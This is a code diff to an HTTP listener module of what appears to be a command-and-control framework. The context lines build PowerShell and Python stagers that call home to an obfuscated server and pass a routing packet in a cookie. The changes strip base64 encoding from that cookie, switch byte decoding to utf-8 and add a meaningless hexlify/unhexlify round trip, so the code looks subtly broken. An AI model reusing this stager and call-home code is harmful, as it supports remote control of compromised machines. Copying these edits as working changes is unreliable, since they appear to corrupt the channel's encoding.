@@ -399,7 +399,7 @@ class Listener(object):
                 try:
                     # prebuild the request routing packet for the launcher
                     routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                    b64RoutingPacket = base64.b64encode(routingPacket)
+                    b64RoutingPacket = routingPacket
 
                     stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
                     cookieString = "{}={};".format(cookie, b64RoutingPacket)
@@ -477,7 +477,7 @@ class Listener(object):
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                b64RoutingPacket = routingPacket
 
                 launcherBase += "req=urllib2.Request(server+t)\n"
                 # add the RC4 packet to a cookie
@@ -1070,9 +1070,7 @@ def send_message(packets=None):
 
                         for part in cookieParts:
                             if part.startswith(session_cookie):
-                                base64RoutingPacket = part[part.find('=')+1:]
-                                # decode the routing packet base64 value in the cookie
-                                routingPacket = base64.b64decode(base64RoutingPacket)
+                                routingPacket = part[part.find('=')+1:]
                 except Exception as e:
                     message = "[*] Failed to obtain routing packet: {}".format(str(e))
                     signal = json.dumps({
@@ -1090,7 +1088,7 @@ def send_message(packets=None):
                     for (language, results) in dataResults:
                         if results:
                             if isinstance(results, bytes):
-                                results = results.decode('latin-1')
+                                results = results.decode('utf-8')
                             if results == 'STAGE0':
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
 
@@ -1129,6 +1127,8 @@ def send_message(packets=None):
                                     'print': True,
                                     'message': message
                                 })
+                                import binascii
+                                results = binascii.unhexlify(binascii.hexlify(results.encode()))
                                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                                 return make_response(results, 200)
                         else:
